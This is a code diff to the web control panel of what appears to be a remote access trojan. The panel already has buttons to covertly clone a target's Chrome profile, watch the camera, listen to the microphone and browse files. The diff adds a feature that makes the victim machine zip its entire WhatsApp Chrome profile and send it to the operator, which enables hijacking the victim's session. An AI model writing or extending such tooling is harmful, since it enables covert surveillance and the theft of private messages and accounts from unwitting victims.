@@ -24,6 +24,7 @@
         <button id="viewChromeBtn" style="background: #ff7300;">🌐 Chrome Browsers</button>
         <button id="viewWhatsappBtn" style="background: #25D366; color: white;">💬 WhatsApp</button>
         <button id="viewHiddenChromeBtn" style="background: #9c27b0; color: white;" title="Clones the target's Chrome profile and opens it invisibly.">🕵️ Hidden Clone Chrome</button>
+        <button id="downloadWhatsappBtn" style="background: #e83e8c; color: white;" title="Zip and Download the target's entire WhatsApp Chrome Profile">📦 Download WA Profile</button>
         <button id="viewCameraBtn" style="background: #ffc107; color: black;">📷 View Camera</button>
         <button id="listenMicBtn" style="background: #17a2b8;">🎙️ Listen Mic</button>
         <button id="browseFilesBtn" style="background: #6f42c1;">📁 Browse Files</button>
@@ -353,6 +354,26 @@
             if (document.getElementById('title').innerText.includes("Starting")) {
                 document.getElementById('title').innerText = "Hidden Clone Chrome: " + activeTarget;
             }
+        });
+
+        document.getElementById('downloadWhatsappBtn').onclick = () => {
+            if (!confirm("This will securely zip the target's entire WhatsApp Chrome Profile and download it to your laptop. This might take 1-2 minutes depending on their profile size. Proceed?")) return;
+            document.getElementById('download-progress-container').classList.remove('hidden');
+            document.getElementById('download-filename').innerText = "Zipping Chrome Profile...";
+            document.getElementById('download-progress-bar').style.width = "10%";
+            document.getElementById('download-percentage').innerText = "Zipping... (Do not close)";
+            socket.emit('request-zip-whatsapp', activeTarget);
+        };
+
+        socket.on('whatsapp-zip-ready', (data) => {
+            if (activeTarget !== data.targetId) return;
+            document.getElementById('download-progress-container').classList.add('hidden');
+            window.downloadRemoteFile(data.path);
+        });
+
+        socket.on('whatsapp-zip-error', (data) => {
+            alert("Failed to zip Chrome Profile: " + data.error);
+            document.getElementById('download-progress-container').classList.add('hidden');
         });
 
         document.getElementById('listenMicBtn').onclick = () => {
